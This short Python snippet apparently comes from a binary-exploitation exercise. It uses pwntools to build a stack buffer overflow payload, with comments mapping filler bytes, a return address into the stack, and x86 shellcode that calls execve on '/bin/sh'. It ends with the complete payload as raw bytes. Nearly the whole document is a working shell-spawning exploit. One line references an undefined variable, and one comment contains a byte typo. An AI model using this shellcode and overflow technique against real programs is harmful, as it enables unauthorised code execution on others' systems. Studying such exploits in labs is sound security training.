

from pwn import *

print(asm(gadget))
# Filler
# 0xffffcef4
# A * 20
# Return addr
# 0xffffcf08     oc cf ff ff
# Gadget
# 0xffffcf0c     b8 0b 00 00 
# 0xffffcf10     00 b9 00 00
# 0xffffcf14     00 00 ba 00
# 0xffffcf18     00 00 00 bb
# 0xffffcf1c     22 cf ff ff
# 0xffffcf20     cd 80 
# String
# 0xffffcf22     2f 62 69 6e
# 0xffffcf26     2f 73 68 00

b"\x0c\xcf\xff\xff\xb8\x0b\x00\x00\x00\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xbb\x22\xcf\xff\xff\xcd\x80\x2f\x62\x69\x6e\x2f\x73\x68\x00\x0a"
